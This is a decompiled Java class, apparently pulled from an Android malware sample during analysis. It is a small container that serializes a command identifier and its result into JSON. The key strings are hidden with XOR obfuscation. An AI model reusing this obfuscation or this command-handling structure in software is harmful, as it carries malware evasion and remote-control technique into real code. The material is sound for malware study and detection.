package com.zjxyxnvvp.nxvxchltf.i;

import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class f {
    private static short[] $ = {7001, 6997, 6999, 6999, 7003, 6996, 7006, 7013, 6995, 7006, 6343, 6347, 6345, 6345, 6341, 6346, 6336, 6395, 6358, 6337, 6359, 6353, 6344, 6352};

    /* renamed from: a  reason: collision with root package name */
    private String f326a;

    /* renamed from: b  reason: collision with root package name */
    private boolean f327b;
    private JSONObject c;
    private JSONObject d;

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public f(String str, boolean z, JSONObject jSONObject) {
        this.f326a = str;
        this.f327b = z;
        this.c = jSONObject;
    }

    public JSONObject a() {
        return this.c;
    }

    public String b() {
        return this.f326a;
    }

    public boolean c() {
        return this.f327b;
    }

    public void d(boolean z) {
        this.f327b = z;
    }

    public void e(JSONObject jSONObject) {
        this.d = jSONObject;
    }

    public JSONObject f() {
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put($(0, 10, 6970), this.f326a);
            jSONObject.put($(10, 24, 6308), this.d);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jSONObject;
    }
}
